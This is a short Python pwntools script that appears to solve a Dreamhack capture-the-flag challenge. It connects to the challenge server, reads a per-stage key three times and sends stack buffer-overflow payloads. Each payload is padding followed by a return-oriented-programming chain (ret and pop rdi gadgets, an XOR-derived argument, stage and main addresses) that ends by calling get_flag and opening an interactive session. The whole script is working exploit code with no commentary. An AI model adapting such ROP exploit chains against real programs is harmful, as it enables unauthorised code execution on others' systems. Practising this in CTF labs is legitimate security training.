from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17952
r = remote(HOST, PORT)

stage1 = 0x4012a3
stage2 = 0x40131a
main=0x401520
get_flag=0x4013b6
ret = 0x40101a
pop_rdi=0x401565

r.recvuntil(b'stage key: ')
key = int(r.recvline().strip().decode(),16)
r.sendafter(b': ', b'A'*24+p64(ret)+p64(pop_rdi)+p64(key^0xcafebabe)+p64(stage1)+p64(ret)+p64(main))

r.recvuntil(b'stage key: ')
key = int(r.recvline().strip().decode(),16)
r.sendafter(b': ', b'A'*24+p64(ret)+p64(pop_rdi)+p64(key^0xf00dbabe)+p64(stage2)+p64(ret)+p64(main))

r.recvuntil(b'stage key: ')
key = int(r.recvline().strip().decode(),16)
r.sendafter(b': ', b'A'*24+p64(ret)+p64(pop_rdi)+p64(key^0x12345678)+p64(get_flag))

r.interactive()